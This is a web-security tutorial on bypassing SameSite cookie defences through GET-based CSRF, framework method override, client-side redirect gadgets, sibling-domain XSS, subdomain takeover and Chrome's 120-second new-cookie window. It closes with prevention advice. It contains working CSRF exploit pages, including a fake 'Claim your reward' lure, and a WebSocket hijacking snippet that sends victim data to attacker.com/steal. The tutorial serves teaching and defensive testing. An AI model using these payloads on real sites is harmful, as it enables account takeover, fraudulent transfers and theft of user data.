# Bypassing SameSite Cookie Restrictions

SameSite is a browser security mechanism that controls whether a website's cookies are sent with cross-site requests, and since Chrome began enforcing Lax restrictions by default in 2021, it has become one of the most significant practical defences against CSRF and related cross-site attack classes. However, SameSite restrictions do not provide guaranteed immunity against cross-site attacks—they only raise the bar for exploitation—and a thorough understanding of how these restrictions are defined, enforced, and circumvented is essential for accurately assessing any application's exposure to cross-site attacks, particularly as the boundary between "site" and "origin" creates subtle but exploitable gaps where sibling-domain vulnerabilities, client-side redirect gadgets, framework method override parameters, and OAuth-induced cookie refresh windows can all be leveraged to bypass even the strictest SameSite configurations. The most critical insight is that SameSite is a browser-enforced mechanism and not a substitute for server-side defences like CSRF tokens—its protections can be circumvented through legitimate browser behaviors, application architecture weaknesses, and same-site gadgets that make cross-site attacks appear indistinguishable from legitimate same-site requests, making defence-in-depth combining SameSite with properly implemented CSRF tokens the only robust protection strategy. 

The central insight: **SameSite restricts cross-site requests, but not same-site ones — any gadget that converts a cross-site trigger into a same-site request completely bypasses all SameSite restrictions regardless of level**.

## Understanding SameSite Fundamentals

### What is a "site" vs. an "origin"?

Understanding SameSite requires precisely distinguishing between two related but distinct concepts — site and origin — because the distinction determines which requests include cookies and which bypass attempts are feasible. 

**Origin (strict, narrow):**

```
An origin = scheme + domain + port (all three must match exactly)

https://example.com:443  (origin A)
https://example.com:443  (origin A - same origin)
https://app.example.com  (different origin - different subdomain)
http://example.com       (different origin - different scheme)
https://example.com:8080 (different origin - different port)
```

**Site (broad, encompasses multiple origins):**

```
A site = eTLD + 1 (effective top-level domain plus one label)

eTLD examples: .com, .net, .org, .co.uk, .github.io

example.com site includes:
https://example.com         ✓ same site
https://app.example.com     ✓ same site (subdomain)
https://intranet.example.com ✓ same site (different subdomain)
http://example.com          ✗ cross-site (different scheme in modern browsers)

cross-site:
https://example.net         ✗ different eTLD
https://evil-example.com    ✗ different TLD+1
https://example.co.uk       ✗ different eTLD
```

**Scheme matters for SameSite (modern browsers):**

```
Chrome (and others): Scheme is part of site definition

https://app.example.com → https://example.com = same-site ✓
http://app.example.com  → https://example.com = cross-site ✗

Implication:
HTTP → HTTPS transition on same domain = CROSS-SITE
Session cookies with SameSite=Strict/Lax NOT included!

Security note:
HTTP pages on same domain cannot be used as SameSite bypass gadgets
(Chrome treats the scheme mismatch as cross-site)
```

**Full same-site vs. same-origin comparison table:**

```
Request From              → Request To                Same-Site?  Same-Origin?
https://example.com       → https://example.com       YES         YES
https://app.example.com   → https://intranet.ex.com   YES         NO (diff subdomain)
https://example.com       → https://example.com:8080  YES         NO (diff port)
https://example.com       → https://example.co.uk     NO          NO (diff eTLD)
https://example.com       → http://example.com        NO          NO (diff scheme)
https://example.com       → https://attacker.com      NO          NO (diff domain)
```

**Critical security implication:**

```
Cross-origin ≠ Cross-site

Cross-origin requests CAN still be same-site!
https://app.example.com → https://other.example.com
= same-site, cross-origin

SameSite cookies INCLUDED in this cross-origin request
Vulnerability on app.example.com = threat to other.example.com
XSS on any subdomain = bypasses SameSite protections site-wide
```

### How SameSite Works

**Before SameSite:**

```
Old browser behavior (no SameSite):
Any site can trigger request to target.com
Browser automatically includes all target.com cookies
CSRF trivially exploitable

attacker.com/malicious.html triggers:
POST https://bank.com/transfer
Cookie: session=VICTIM_SESSION  ← Browser auto-includes
Server trusts request → funds transferred!
```

**With SameSite:**

```
Set-Cookie: session=TOKEN; SameSite=Lax

attacker.com/malicious.html triggers:
POST https://bank.com/transfer
(No cookie included — SameSite=Lax blocks cross-site POST)
Server: "No session cookie → not authenticated → rejected"
CSRF blocked!
```

## SameSite Restriction Levels

### SameSite=Strict

**Definition:** Cookies never sent in any cross-site request, regardless of method or navigation type. 

```http
Set-Cookie: session=TOKEN; SameSite=Strict; Secure; HttpOnly
```

**Behaviour:**

```
Cookie sent when:
✓ Same-site requests (any method, any type)
✓ User types URL directly in address bar (no prior site)
✓ Bookmarks opened directly

Cookie NOT sent when:
✗ User clicks link from another site (top-level GET navigation!)
✗ Cross-site form submission (POST)
✗ Cross-site AJAX requests
✗ Cross-site image/script loads
✗ Cross-site iframes
✗ Any cross-site redirect

Important: Even legitimate links from Google/email are cross-site!
User clicks https://bank.com in Google results:
→ Session cookie NOT included in that initial request
→ User appears not logged in until they navigate within the site
```

**Trade-offs:**

```
Strictest protection:
✓ Blocks all cross-site attack vectors
✓ Immune to GET-based CSRF
✓ Immune to link-based CSRF

User experience impact:
✗ Users appear logged out when following external links
✗ OAuth flows broken (OAuth redirects from cross-site)
✗ Email verification links: user not logged in on click
✗ Third-party integrations disrupted

Best use cases:
- Session cookies for banking, healthcare, high-security apps
- Admin cookies that should never be cross-site accessible
- API-only authentication tokens
```

### SameSite=Lax

**Definition:** Cookies sent cross-site only for top-level GET navigations. 

```http
Set-Cookie: session=TOKEN; SameSite=Lax; Secure; HttpOnly
```

**Two conditions BOTH required for cross-site cookie inclusion:**

```
Condition 1: HTTP GET method
Condition 2: Top-level navigation (URL bar changes)

Both must be true for cross-site cookie inclusion

Cross-site requests THAT receive cookies:
✓ User clicks a link → top-level GET navigation ✓
✓ document.location = 'https://target.com' → top-level navigation ✓
✓ window.location.href = 'https://target.com' → top-level navigation ✓

Cross-site requests that do NOT receive cookies:
✗ Cross-site POST form submission (method mismatch)
✗ Cross-site fetch() with credentials (background request)
✗ Cross-site XMLHttpRequest (background request)
✗ Cross-site <img src="..."> (not top-level navigation)
✗ Cross-site <iframe src="..."> (not top-level)
✗ Cross-site <script src="..."> (not top-level)
✗ Any background/subresource cross-site request
```

**Chrome's Lax-by-default (since 2021):**

```
If no SameSite attribute set:
Set-Cookie: session=TOKEN  (no SameSite specified)

Chrome applies Lax automatically
Firefox: Working towards same behavior
Safari: Has own ITP mechanism

Impact:
Old applications assuming no SameSite = None behavior
May now have broken functionality
Some developers responded by adding SameSite=None to all cookies
(Accidentally disabling CSRF protection!)
```

### SameSite=None

**Definition:** Explicitly disables all SameSite restrictions; cookies sent in all cross-site requests. 

```http
Set-Cookie: trackingId=TOKEN; SameSite=None; Secure
```

**Requirements:**

```
Must include Secure attribute:
Set-Cookie: session=TOKEN; SameSite=None; Secure ✓
Set-Cookie: session=TOKEN; SameSite=None         ✗ (browsers reject!)

Rationale: If you're allowing cross-site access, 
minimum guarantee is HTTPS transmission
```

**Legitimate use cases:**

```
✓ Third-party payment widgets embedded in merchant sites
✓ Cross-site analytics where cookie tracks behavior
✓ Advertising tracking cookies
✓ Social sharing buttons requiring authentication
✓ Federated authentication where cross-site is required

Danger:
✗ Session/auth cookies set to None = full CSRF risk
✗ Lax-by-default caused panic → developers set all cookies to None
✗ Now those cookies have ZERO CSRF protection
```

**Testing insight:**

```
Any SameSite=None cookie:
→ Investigate what it grants the bearer
→ If it provides any authentication/authorization:
  CSRF attack possible using classic techniques (hidden form, etc.)
→ Even if "just" a tracking cookie:
  May be combined with other vulnerabilities
```

## Bypass 1: Lax Restrictions via GET Requests

### The core vulnerability

**SameSite=Lax allows GET cross-site → any GET-accepting state-changing endpoint is vulnerable:** 

```
Lax allows: Cross-site GET if top-level navigation

Normal developer assumption:
GET = read-only (idempotent)
POST = state-changing

Reality:
Many servers process state changes on GET requests
HTTP spec: should not, but often do

Vulnerability condition:
Session cookie: SameSite=Lax (or default)
Endpoint: Accepts GET for state-changing action
Result: CSRF via GET link/redirect
```

**Testing for GET-based state changes:**

```http
Original POST request:
POST /account/change-email HTTP/1.1
Host: vulnerable.com
Cookie: session=VICTIM_SESSION
Content-Type: application/x-www-form-urlencoded

email=victim@normal.com&csrf=TOKEN

Test: Does GET work?
GET /account/change-email?email=attacker@evil.com HTTP/1.1
Host: vulnerable.com
Cookie: session=VICTIM_SESSION

→ 200 OK / redirect = State changed! Vulnerable to GET CSRF
→ 405 Method Not Allowed = GET rejected (not vulnerable this way)
→ 403 Forbidden = Some validation (investigate further)
```

**Exploit: Direct document.location redirect:**

```html
<!-- Simplest Lax bypass: top-level GET navigation -->
<html>
<body>
    <script>
        // Top-level navigation (changes URL bar) → SameSite=Lax allows cookies!
        document.location = 'https://vulnerable-website.com/account/change-email?email=attacker@evil-user.net';
    </script>
</body>
</html>
```

```
Attack flow:
1. Victim visits attacker's page
2. JavaScript sets document.location to target URL (top-level navigation)
3. Browser: "Is this a top-level GET navigation?" → YES
4. SameSite=Lax: "Top-level GET? Include the cookie!"
5. Request sent:
   GET /account/change-email?email=attacker@evil-user.net HTTP/1.1
   Cookie: session=VICTIM_SESSION  ← Included!
6. Server processes GET request
7. Email changed — CSRF successful!
```

### Method override bypass

**Framework method override parameters:** 

```
Problem: Server returns 405 Method Not Allowed for GET
          But only validates action on POST

Solution: Send GET request that server interprets as POST
(Many frameworks support this for HTML form compatibility)

Common override parameters:
Framework      | Parameter      | Example
Symfony        | _method        | ?_method=POST
Laravel        | _method        | <input name="_method" value="POST">
Rails          | _method        | ?_method=POST
Django         | (via middleware)| X-HTTP-Method-Override header
Express        | (via plugin)   | method-override package
Spring MVC     | _method        | ?_method=POST
```

**How method override works:**

```
Browser sends: GET /transfer-payment?_method=POST&recipient=hacker&amount=1000
           (SameSite=Lax allows this - top-level GET navigation)

Web framework sees:
- HTTP transport: GET request
- _method parameter: POST
- Framework routes as: POST /transfer-payment

Effect:
Browser: "I'm sending a GET" → SameSite=Lax → Cookie included
Server: "I'm processing a POST" → Applies POST logic → State changed!

CSRF bypass:
Browser's cookie policy sees a GET (allows cookies)
Server's routing sees a POST (performs state change)
```

**Exploit page for method override:**

```html
<!-- Bypass for SameSite=Lax when GET returns 405 but POST works -->
<html>
<body>
    <!-- Method 1: Form with _method override (POST form sent as GET-routed-as-POST) -->
    <form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
        <input type="hidden" name="_method" value="GET">
        <input type="hidden" name="recipient" value="attacker_account">
        <input type="hidden" name="amount" value="10000">
    </form>
    <script>document.forms[0].submit();</script>
    
    <!--
    Wait — this sends a POST from cross-site
    SameSite=Lax blocks cross-site POST
    Need to use GET as the transport:
    -->
</body>
</html>

<!-- CORRECT approach: GET request with _method=POST in URL -->
<html>
<body>
    <script>
        // GET transport (Lax allows) + _method=POST (server routes as POST)
        document.location = 'https://vulnerable-website.com/account/change-email' +
                            '?_method=POST' +
                            '&email=attacker@evil-user.net';
    </script>
</body>
</html>
```

**Step-by-step bypass verification:**

```
Step 1: Identify state-changing POST endpoint
POST /my-account/change-email HTTP/1.1
body: email=test@test.com

Step 2: Check session cookie SameSite attribute
Response: Set-Cookie: session=TOKEN; SameSite=Lax
(or no SameSite = Chrome applies Lax)

Step 3: Test plain GET
GET /my-account/change-email?email=test@test.com HTTP/1.1
→ 405 Method Not Allowed (GET rejected directly)

Step 4: Test _method override
GET /my-account/change-email?_method=POST&email=test@test.com HTTP/1.1
→ 302 Found / 200 OK = METHOD OVERRIDE WORKS!
Framework processed as POST, accepted the change

Step 5: Construct exploit page
<script>
document.location = 'https://vulnerable.com/my-account/change-email?_method=POST&email=attacker@evil.com';
</script>

Step 6: Deliver to victim
When victim visits exploit page:
- Top-level GET navigation → SameSite=Lax → session cookie included
- Server sees _method=POST → routes as POST → processes change
- Email changed!
```

### Other method override mechanisms

```http
HTTP Header override (if server supports):
GET /change-email?email=attacker@evil.com HTTP/1.1
X-HTTP-Method-Override: POST
X-HTTP-Method: POST

Tunneled method (some REST APIs):
GET /change-email?email=attacker@evil.com&_httpMethod=POST HTTP/1.1

Query parameter variations:
?_method=POST       (Symfony, Rails, Laravel)
?method=POST        (some custom implementations)
?http_method=POST   (custom implementations)
?httpMethod=POST    (custom implementations)
?tunneled_method=POST (various)
```

## Bypass 2: Strict/Lax Restrictions via On-Site Gadgets

### The client-side redirect gadget

**Core concept — same-site request bypasses ALL SameSite restrictions:** 

```
Key insight:
SameSite restrictions only apply to CROSS-SITE requests
Same-site requests always include cookies

If attacker can chain:
1. Cross-site trigger (attacker.com → victim.com)
2. On-site gadget (something on victim.com that navigates further)
3. Target endpoint (state-changing action on victim.com)

The final request (step 3) is same-site!
All SameSite restrictions bypassed!

Gadget = On-site functionality that can be manipulated to 
         redirect/navigate the user to an attacker-chosen URL
         within the same site
```

**Why client-side redirects are different from server-side redirects:**

```
Server-side redirect:
Request 1: GET https://attacker.com/ (cross-site trigger)
           Server responds: 302 Location: https://victim.com/target
Request 2: GET https://victim.com/target
           Browser: "This request chain STARTED cross-site"
           → Applies cross-site cookie restrictions to Request 2
           → Session cookie NOT included
           → SameSite protection holds

Client-side redirect (JavaScript/HTML):
Request 1: GET https://victim.com/gadget?param=../target (cross-site trigger)
           Server responds: 200 OK (page with JavaScript redirect)
           JavaScript executes: document.location = '../target'
Request 2: GET https://victim.com/target
           Browser: "This is an independent, standalone request"
           "Source: same site (victim.com)"
           → Applies same-site rules: All cookies included!
           → Session cookie included!
           → SameSite protection BYPASSED!

The browser treats the JavaScript-initiated navigation as
a fresh same-site request, not a continuation of the cross-site chain
```

### Finding client-side redirect gadgets

**What to look for:**

```
Any JavaScript code that:
1. Reads from attacker-controllable source:
   - URL parameters: location.search, URLSearchParams
   - URL hash: location.hash
   - Path segments: location.pathname
   - window.name, document.referrer

2. Uses that value to navigate:
   - document.location = value
   - window.location.href = value
   - window.location.replace(value)
   - location.assign(value)
   - history.pushState (potentially)

Examples:

// 1. Page redirect based on URL parameter
const redirect = new URLSearchParams(location.search).get('redirect');
document.location = redirect;  // Gadget! If value reaches document.location

// 2. Path construction
const postId = new URLSearchParams(location.search).get('postId');
document.location = '/post/' + postId;  // Gadget! Path traversal possible

// 3. Hash-based navigation
document.location = location.hash.slice(1);  // Gadget!

// 4. Error page redirect
const returnUrl = document.getElementById('return-url').textContent;
setTimeout(() => document.location = returnUrl, 3000);  // Gadget!
```

**Comment confirmation redirect — real example:** 

```javascript
// Vulnerable gadget: commentConfirmationRedirect.js
// On page: /post/comment/confirmation?postId=7

const urlParams = new URLSearchParams(window.location.search);
const postId = urlParams.get('postId');

// After 3 seconds, redirect to blog post
setTimeout(() => {
    document.location = '/post/' + postId;  // GADGET!
}, 3000);

// Normal use:
// /post/comment/confirmation?postId=7
// → redirects to /post/7

// Attack use (path traversal):
// /post/comment/confirmation?postId=../my-account/change-email?email=attacker@evil.com%26submit=1
// → redirects to /post/../my-account/change-email?email=attacker@evil.com&submit=1
// → resolves to /my-account/change-email?email=attacker@evil.com&submit=1
```

**Full exploit using client-side redirect gadget:**

```html
<!-- Attacker's exploit page (attacker.com) -->
<html>
<body>
    <script>
        // Step 1: Navigate to gadget page on victim.com (cross-site, but that's OK)
        // The gadget URL is on victim.com, so it IS same-site from there
        
        document.location = 'https://vulnerable.com/post/comment/confirmation' +
            '?postId=../my-account/change-email' +
            '%3Femail%3Dattacker%40evil-user.net' +    // ?email=attacker@evil-user.net
            '%26submit%3D1';                             // &submit=1
    </script>
</body>
</html>
```

```
Attack flow:
1. Victim visits attacker's page (cross-site)
2. JavaScript redirects to victim.com/post/comment/confirmation?postId=..
3. Browser: "New top-level navigation to victim.com" → cross-site cookie rules apply
   BUT this request only loads a page with JavaScript — no state change yet
4. JavaScript on victim.com reads postId parameter
5. setTimeout fires: document.location = '/post/../my-account/change-email?email=attacker@...'
6. Browser: "Navigation initiated by victim.com JavaScript"
   → Same-site request!
   → ALL cookies included regardless of SameSite level!
7. GET /my-account/change-email?email=attacker@evil-user.net
   Cookie: session=VICTIM_SESSION (included!)
8. Email changed — SameSite=Strict BYPASSED!
```

**Why server-side redirects don't work the same way:**

```
If victim.com uses server-side redirect at step 3:
GET /redirect?to=/my-account/change-email?email=attacker
→ 302 Location: /my-account/change-email?email=attacker

Browser: "This is a redirect following a cross-site initial request"
→ Applies cross-site restrictions to redirect target
→ SameSite=Strict: Cookie NOT included
→ Attack fails!

Browser explicitly tracks the cross-site origin through server redirects
But "forgets" the cross-site origin for JavaScript-initiated navigations
```

### Path traversal in gadgets

**Using ../ to escape intended paths:**

```
Gadget URL pattern:
/post/comment/confirmation?postId=VALUE
→ redirects to /post/VALUE

Normal: postId=7 → /post/7
Attack: postId=../my-account → /post/../my-account → /my-account

URL encoding required for special characters:
? = %3F
& = %26
= = %3D
@ = %40
/ = %2F (sometimes)

Full attack URL construction:
/post/comment/confirmation?postId=
  ../my-account/change-email
  %3F   (?)
  email%3D  (email=)
  attacker%40evil.com  (attacker@evil.com)
  %26   (&)
  submit%3D1  (submit=1)

Final redirect target:
/my-account/change-email?email=attacker@evil.com&submit=1
```

## Bypass 3: Restrictions via Vulnerable Sibling Domains

### Same-site cross-origin attack surface 

**Why sibling domains matter:**

```
Remember: Cross-origin ≠ Cross-site

app.example.com  and  secure.example.com are:
- Cross-origin (different subdomain → different origin)
- Same-site (both TLD+1 = example.com)

Consequence:
If XSS found on app.example.com:
- JavaScript executes in app.example.com origin
- Makes request to secure.example.com
- Browser: "Same-site request → all cookies included!"
- SameSite=Strict/Lax: Both bypassed by sibling XSS!
```

**Audit all domains sharing the same eTLD+1:**

```
For target: secure.bank.com

Find ALL related domains:
- bank.com
- app.bank.com
- api.bank.com
- staging.bank.com
- dev.bank.com
- blog.bank.com
- support.bank.com
- careers.bank.com

Vulnerability in ANY of these:
→ Can trigger same-site requests to secure.bank.com
→ SameSite restrictions provide NO protection

Attack scenario:
1. XSS found on: blog.bank.com/comments
2. Victim visits blog post (legitimate browsing)
3. Stored XSS payload executes:
   fetch('https://secure.bank.com/transfer', {
       method: 'POST',
       credentials: 'include',  // Include cookies
       body: 'amount=10000&to=attacker'
   });
4. Browser: "blog.bank.com → secure.bank.com = SAME SITE"
5. Session cookie included in POST request
6. Transfer processed!
7. SameSite=Strict completely defeated by sibling XSS!
```

**Cross-site WebSocket hijacking (CSWSH):**

```javascript
// WebSocket connection establishment subject to SameSite
// WebSocket handshake = HTTP GET with Upgrade header

// If target uses WebSockets:
// Vulnerable: ws://vulnerable.com/chat  (no SameSite protection on WS upgrade cookies)

// Attack from sibling domain:
const ws = new WebSocket('wss://secure.bank.com/feed');

ws.onopen = function() {
    // Connected with victim's session cookie!
    console.log('WebSocket connected as victim');
};

ws.onmessage = function(msg) {
    // Receive victim's WebSocket data
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(msg.data));
};

// Cross-site WebSocket hijacking = CSRF for WebSocket connections
// SameSite restrictions don't protect WebSocket handshakes from sibling XSS
```

**Subdomain takeover as bypass vector:**

```
Scenario: abandoned-subdomain.victim.com DNS entry exists
But hosting no longer configured → takeover possible

Attack:
1. Register hosting for abandoned-subdomain.victim.com
2. Host exploit page there
3. Victim visits abandoned-subdomain.victim.com
4. JavaScript executes on same-site origin
5. Can make same-site requests to main site
6. SameSite=Strict bypassed!

Why it works:
abandoned-subdomain.victim.com = same site as victim.com
Browser includes session cookies for victim.com
Full SameSite bypass without needing XSS!
```

## Bypass 4: Lax Restrictions with Newly Issued Cookies

### The 120-second grace period 

**Chrome's implementation detail — the two-minute window:**

```
Why this exception exists:
SSO (Single Sign-On) flows often involve:
1. User visits site
2. Redirected to OAuth/SSO provider
3. Authenticates at provider
4. Provider POST-redirects BACK to site
   (POST with authentication data)
5. Site issues new session cookie

Problem without exception:
SameSite=Lax blocks cross-site POST in step 4
SSO login mechanisms broken!

Chrome's solution:
New cookies (without explicit SameSite attribute) receive 120-second grace period
During grace period: Cookie included in cross-site POST requests too

After 120 seconds: Strict Lax enforcement resumes

Note: Only applies to cookies WITHOUT explicit SameSite attribute
Explicitly set SameSite=Lax cookies: NO grace period
```

**Exploitation using OAuth-induced cookie refresh:**

```
Prerequisites:
- Target site uses OAuth/SSO for authentication
- Session cookie set without explicit SameSite attribute
- OAuth flow generates NEW session cookie each time

Attack steps:

Step 1: Force victim to trigger new session cookie issuance
→ Navigate them through OAuth login flow
→ This generates a fresh session cookie with 120-second window

Step 2: Within 120 seconds, deliver CSRF POST attack
→ Standard hidden form POST CSRF
→ Browser includes new session cookie (grace period active)
→ CSRF succeeds!

Challenge: Timing (must be within 120 seconds)
Solution: Force cookie refresh programmatically, then immediately attack
```

### Implementing the timing attack

**Using window.open() for cookie refresh:**

```javascript
// PROBLEM: Popup window blocked unless triggered by user interaction
window.open('https://vulnerable.com/login/sso');  // BLOCKED by browser

// Why blocked:
// Browser popup blockers prevent programmatic popups
// Only allows popups triggered by user gestures (clicks)
```

**Bypass using onclick event handler:**

```html
<!-- Strategy: Get ONE user click, then execute full attack chain -->
<html>
<head>
    <title>Congratulations!</title>
</head>
<body>
    <button id="btn">Claim your reward</button>
    
    <form id="csrf-form" 
          action="https://vulnerable-website.com/my-account/change-email" 
          method="POST">
        <input type="hidden" name="email" value="attacker@evil-user.net">
    </form>
    
    <script>
        window.onclick = () => {
            // Step 1: Open popup to trigger OAuth/SSO flow
            // This forces a new session cookie to be issued
            window.open('https://vulnerable-website.com/login/sso');
            
            // Step 2: After short delay (SSO completes),
            // submit CSRF attack within 120-second window
            setTimeout(() => {
                document.getElementById('csrf-form').submit();
            }, 4000);  // 4 seconds - SSO flow completes
        };
    </script>
</body>
</html>
```

```
Attack flow:
1. Victim visits attacker's page
2. Victim clicks "Claim your reward" button
3. onclick triggers:
   a. window.open() allowed (within user gesture handler)
   b. New tab opens with victim.com/login/sso
   c. OAuth flow runs (victim already logged in to OAuth provider)
   d. New session cookie issued to victim's browser
      Set-Cookie: session=NEW_TOKEN  (no explicit SameSite!)
      → 120-second grace period begins
4. After 4 seconds: CSRF form submits as POST
5. Browser: "Cookie was issued <4 seconds ago, within 120-second window"
   → Includes session cookie in cross-site POST
6. Server processes POST with victim's new session
7. Email changed — SameSite Lax (default) bypassed!
```

**Alternative: Refreshing from a new tab:**

```javascript
window.onclick = () => {
    // Open login/SSO in new tab
    const popup = window.open('https://vulnerable.com/login/sso');
    
    setTimeout(() => {
        // Close the popup
        popup.close();
        
        // Submit the CSRF attack from current tab
        // (120-second window still active)
        document.forms[0].submit();
    }, 3000);
};
```

**Why this technique is timing-dependent:**

```
120-second window calculation:
Cookie issued at: T+0
CSRF POST submitted at: T+4 seconds (within window)
→ Attack succeeds!

If CSRF POST submitted at: T+121 seconds
→ Attack fails (window expired)

Practical considerations:
- OAuth/SSO flow must complete within window
- Network latency affects timing
- Victim's browser must accept popup
- May require testing to calibrate timing
- Real-world reliability can vary
```

## Complete Attack Scenarios by SameSite Level

### SameSite=None — classic CSRF (no bypass needed)

```html
<!-- No bypass needed — just standard CSRF -->
<html>
<body onload="document.forms[0].submit()">
    <form action="https://vulnerable.com/email/change" method="POST">
        <input type="hidden" name="email" value="attacker@evil.com">
    </form>
</body>
</html>
```

### SameSite=Lax — bypass decision tree

```
Check 1: Does endpoint accept GET for state changes?
   YES → Use document.location redirect (top-level GET navigation)
   NO  → Check 2

Check 2: Does framework support method override (_method=POST)?
   YES → GET request with ?_method=POST parameter
   NO  → Check 3

Check 3: Is there a client-side redirect gadget?
   YES → Chain: trigger gadget → same-site redirect → target
   NO  → Check 4

Check 4: Is session cookie set without explicit SameSite attribute?
   YES → OAuth-refresh timing attack (120-second window)
   NO  → Check 5

Check 5: Is there a vulnerable sibling domain?
   YES → Exploit sibling domain (XSS, subdomain takeover, etc.)
         → Make same-site requests to target
   NO  → SameSite=Lax providing real protection (for now)
```

### SameSite=Strict — bypass decision tree

```
Strict is harder — blocks ALL cross-site requests including top-level GET

Check 1: Is there a client-side redirect gadget?
   YES → Most powerful bypass for Strict
         Cross-site trigger → gadget → same-site redirect → target
   NO  → Check 2

Check 2: Is there a vulnerable sibling domain?
   YES → XSS or other RCE on sibling domain
         → Same-site requests to target (includes Strict cookies!)
   NO  → Check 3

Check 3: Is there a subdomain takeover?
   YES → Takeover abandoned subdomain
         → Same-site requests to target
   NO  → Check 4

Check 4: Can you find any other same-site interaction?
   → JSONP endpoints
   → Open redirects (client-side only)
   → Postmessage handlers
   → Any other JavaScript execution on same site
   NO  → SameSite=Strict providing strong protection
```

## Prevention and Secure Implementation

### Setting SameSite correctly

**Recommended cookie security configuration:**

```javascript
// Node.js/Express: Comprehensive secure cookie setup
app.use(session({
    name: 'sessionId',
    secret: process.env.SESSION_SECRET,
    cookie: {
        httpOnly: true,       // Prevent JavaScript access
        secure: true,         // HTTPS only
        sameSite: 'strict',   // Explicitly set (don't rely on defaults)
        maxAge: 3600000       // 1 hour expiry
    }
}));
```

```http
Recommended Set-Cookie for auth sessions:
Set-Cookie: session=TOKEN; Secure; HttpOnly; SameSite=Strict; Path=/

For sessions requiring some cross-site navigation (OAuth flows):
Set-Cookie: session=TOKEN; Secure; HttpOnly; SameSite=Lax; Path=/

Never for sensitive cookies:
Set-Cookie: session=TOKEN; SameSite=None; Secure  ✗ No CSRF protection
Set-Cookie: session=TOKEN  ✗ Relies on Chrome Lax default
```

### Defence-in-depth — SameSite is not enough

**Combine with CSRF tokens:**

```
Why SameSite alone is insufficient:
✓ SameSite=Strict blocks most CSRF vectors
✗ Client-side redirect gadgets bypass Strict
✗ Sibling domain XSS bypasses Strict
✗ 120-second window bypasses Lax (default)
✗ SameSite=None = zero CSRF protection

Why CSRF tokens alone are insufficient:
✓ Properly implemented tokens block forged requests
✗ Token implementation bugs are common (as discussed in previous section)
✗ Attacker with XSS can steal tokens anyway

Combined defence:
SameSite=Strict + CSRF Tokens
= Attacker must:
  1. Find a same-site gadget to bypass SameSite, AND
  2. Find a way to forge/steal the CSRF token
= Two independent barriers to overcome
= Robust CSRF protection
```

**Mitigating gadget-based bypasses:**

```javascript
// Mitigate client-side redirect gadgets

// VULNERABLE: Arbitrary URL redirection
const target = new URLSearchParams(location.search).get('postId');
document.location = '/post/' + target;

// FIX 1: Allowlist valid values
const postId = new URLSearchParams(location.search).get('postId');
if (!/^\d+$/.test(postId)) {
    // Not a valid numeric post ID
    document.location = '/';
    return;
}
document.location = '/post/' + postId;  // Only numeric IDs allowed

// FIX 2: URL validation for redirect parameters
function safeRedirect(url) {
    try {
        const parsed = new URL(url, window.location.origin);
        // Only allow same-origin redirects
        if (parsed.origin !== window.location.origin) {
            return '/';  // Default safe URL
        }
        return parsed.pathname + parsed.search;
    } catch {
        return '/';
    }
}
```
